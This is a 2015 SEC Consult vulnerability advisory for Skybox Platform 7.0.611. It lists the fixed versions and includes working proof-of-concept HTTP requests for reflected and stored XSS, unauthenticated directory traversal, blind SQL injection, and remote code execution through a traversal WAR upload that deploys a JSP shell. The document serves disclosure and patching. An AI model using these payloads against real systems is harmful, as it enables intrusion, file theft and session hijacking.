@@ -1,0 +1,265 @@
+SEC Consult Vulnerability Lab Security Advisory < 20151210-0 >
+=======================================================================
+              title: Multiple Vulnerabilities
+            product: Skybox Platform
+ vulnerable version: <=7.0.611
+      fixed version: 7.5.401
+         CVE number:
+             impact: Critical
+           homepage: www.skyboxsecurity.com/products/appliance
+              found: 2014-12-04
+                 by: K. Gudinavicius, M. Heinzl, C. Schwarz (Office Singapore)
+                     SEC Consult Vulnerability Lab
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Frankfurt/Main - Montreal - Moscow
+                     Singapore - Vienna (HQ) - Vilnius - Zurich
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Skybox Security provides cutting-edge risk analytics for enterprise security
+management. Our solutions give you complete network visibility, help you
+eliminate attack vectors, and optimize your security management processes.
+Protect the network and the business."
+Source: http://www.skyboxsecurity.com/
+
+Business recommendation:
+------------------------
+Attackers are able to perform Cross-Site Scripting and SQL Injection attacks
+against the Skybox platform. Furthermore, it is possible for
+unauthenticated attackers to download arbitrary files and execute arbitrary
+code.
+
+SEC Consult recommends the vendor to conduct a comprehensive security
+analysis, based on security source code reviews, in order to identify all
+available vulnerabilities in the Skybox platform and increase the security
+of its customers.
+
+Vulnerability overview/description:
+-----------------------------------
+1) Multiple Reflected Cross-Site Scripting Vulnerabilities
+2) Multiple Stored Cross-Site Scripting Vulnerabilities
+3) Arbitrary File Download and Directory Traversal Vulnerability
+4) Blind SQL Injection Vulnerability
+5) Remote Unauthenticated Code Execution
+
+Proof of concept:
+-----------------
+1) Multiple Reflected Cross-Site Scripting Vulnerabilities
+Multiple scripts are prone to reflected Cross-Site Scripting attacks.
+The following example demonstrates this issue with the
+service VersionRepositoryWebService:
+
+POST /skyboxview/webservice/services/VersionRepositoryWebService HTTP/1.0
+Content-type: text/plain
+User-Agent: Axis/1.4
+Host: localhost:8282
+SOAPAction: ""
+Content-Length: 863
+<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope
+xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body><ns1:checkV
+ersion
+soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
+xmlns:ns1="http://com/skybox/view/webservice/versionrepositoryc4f85">&l
+t;a
+xmlns:a=&apos;http://www.w3.org/1999/xhtml&apos;><a:body
+onload=&apos;alert(1)&apos;/></a>9884933253b"><components
+soapenc:arrayType="soapenc:string[1]" xsi:type="soapenc:Array"
+xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"><components
+xsi:type="soapenc:string">Application</components></components><os
+xsi:type="soapenc:string"
+xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">windows-64</os><curre
+ntVersion
+xsi:type="soapenc:string"
+xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">7.0.601</currentVersi
+on></ns1:checkVersion></soapenv:Body></soapenv:Envelope>
+
+Other scripts and parameters, such as the parameter status of the login script
+(located at https://localhost:444/login.html) are affected as well. The
+following request demonstrates this issue:
+https://localhost:444/login.html?status=%27%3C/script%3E%3Cscript%3Ealert%28doc
+ument.cookie%29%3C/script%3E
+
+2) Multiple Stored Cross-Site Scripting Vulnerabilities
+Multiple fields of the Skybox Change Manager, which can be accessed at
+https://localhost:8443/skyboxview/, are prone to stored Cross-Site Scripting
+attacks. For example when creating a new ticket, the title can be misused
+to insert JavaScript code. The following request to the server demonstrates
+the issue:
+
+Request:
+POST /skyboxview/webskybox/tickets HTTP/1.1
+Host: localhost:8443
+[...]
+7|0|18|https://localhost:8443/skyboxview/webskybox/|272....5E|com.skybox.view.g
+wt.client.service.TicketsService|createAccessChangeTicket|com.skybox.view.trans
+fer.netmodel.tickets.AccessChangeTicketData/1874789321|com.skybox.view.transfer
+.modelview.ChangeRequestGraph/1577593632|com.skybox.view.transfer.netmodel.phas
+es.BasePhaseOperation/3921542662|java.util.Collection|com.skybox.view.transfer.
+netmodel.PhaseDefinitionId/3246549697|java.lang.String/2004016611|com.skybox.vi
+ew.transfer.properties.PropertyBag/343216801|com.skybox.view.transfer.netmodel.
+TicketWorkflowId/3953158119|com.skybox.view.transfer.netmodel.ConfigurationItem
+Id/1448062761|com.skybox.view.transfer.netmodel.tickets.ChangeRequestRiskEnum/8
+52682809||skyboxview|test"><img
+src=yy onerror=alert(document.cookie) >|java.util.ArrayList/41
+
+Other fields, like "Comments" and "Description", are affected as well.
+
+3) Arbitrary File Download and Directory Traversal Vulnerability
+Skybox Change Manager allows to upload and download attachments for tickets.
+The download functionality can be exploited to download arbitrary files. No
+authentication is required to exploit this vulnerability. The following
+request demonstrates the issue:
+POST /skyboxview/webskybox/attachmentdownload HTTP/1.1
+Host: localhost:8443
+tempShortFileName=aaaaaa&tempFileName=../../../../../../../../../../../windows/
+win.ini
+
+The script /skyboxview/webskybox/filedownload is also affected by the same
+vulnerability.
+
+Note: The upload functionality can also be used to upload files without
+authentication.
+
+4) Blind SQL Injection Vulnerability
+Arbitrary SQL queries can be inserted into the service VersionWebService. The
+following request demonstrates this issue with a simple sleep statement:
+
+POST https://localhost:8443/skyboxview/webservice/services/VersionWebService
+HTTP/1.1
+Accept-Encoding: gzip,deflate
+Content-Type: text/xml;charset=UTF-8
+SOAPAction: ""
+Content-Length: 619
+Host: localhost:8443
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:ver="http://com/skybox/view/webservice/version">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ver:getUserLockInSeconds
+soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+         <username xsi:type="soapenc:string"
+xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">admin&apos;+(select
+* from (select(sleep(20)))a)+&apos;</username>
+      </ver:getUserLockInSeconds>
+   </soapenv:Body>
+</soapenv:Envelope>
+
+No authentication is required to exploit this vulnerability.
+
+5) Remote Unauthenticated Code Execution
+It is possible to upload WAR files, containing for example JSP files, which
+will be automatically deployed by the Skybox appliance. This way, it is
+possible to upload a JSP shell which enables an attacker to execute arbitrary
+commands running in the same context as the web server running (by default
+skyboxview).
+The following request to the Skyboxview update service (located at
+https://localhost:9443) uploads a JSP file. It will be uploaded to
+/opt/skyboxview/thirdparty/jboss/server/web/deploy where it is automatically
+extracted and deployed at
+/opt/skyboxview/thirdparty/jboss/server/web/work/jboss.web/localhost.
+
+POST /skyboxview-softwareupdate/services/CollectorSoftwareUpdate HTTP/1.1
+Accept-Encoding: gzip,deflate
+SOAPAction: ""
+Content-Type: multipart/related; type="text/xml";
+start="<rootpart@soapui.org>";
+boundary="----=_Part_1_1636307031.1418103287783"
+MIME-Version: 1.0
+User-Agent: Jakarta Commons-HttpClient/3.1
+Host: localhost:9443
+Content-Length: 1944
+
+------=_Part_1_1636307031.1418103287783
+Content-Type: text/xml; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+Content-ID: <rootpart@soapui.org>
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:sof="http://com/skybox/view/agent/webservice/softwareupdate">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <sof:uploadPatch
+soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+         <patchName xsi:type="soapenc:string"
+xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">../../thirdparty/jbos
+s/server/web/deploy/helloworld2.war</patchName>
+<patchData href="cid:helloworld.war"/>
+      </sof:uploadPatch>
+   </soapenv:Body>
+</soapenv:Envelope>
+------=_Part_1_1636307031.1418103287783
+Content-Type: application/octet-stream; name=helloworld.war
+Content-Transfer-Encoding: binary
+Content-ID: <helloworld.war>
+Content-Disposition: attachment; name="helloworld.war"; filename="helloworld.wa
+r"
+
+[binary]
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerabilities have been verified to exist in the Skybox platform
+version 7.0.611, which was the most recent version at the time of discovery.
+
+Vendor contact timeline:
+------------------------
+Communication with the vendor was handled by SEC Consult's client.
+
+Solution:
+---------
+According to the release-notes, the issues have been fixed in the following
+versions (reference number "19184"):
+7.5.401: Reflected Cross-site scripting vulnerabilities
+7.5.201: Remote Code Execution, SQL Injection, Arbitrary File Download and
+         Directory Traversal
+
+Users of Skybox are advised to upgrade to version 7.5.401 or higher.
+
+Workaround:
+-----------
+None
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Frankfurt/Main - Montreal - Moscow
+Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/Career.htm
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://www.sec-consult.com/en/About/Contact.htm
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF M. Heinzl/ @2015
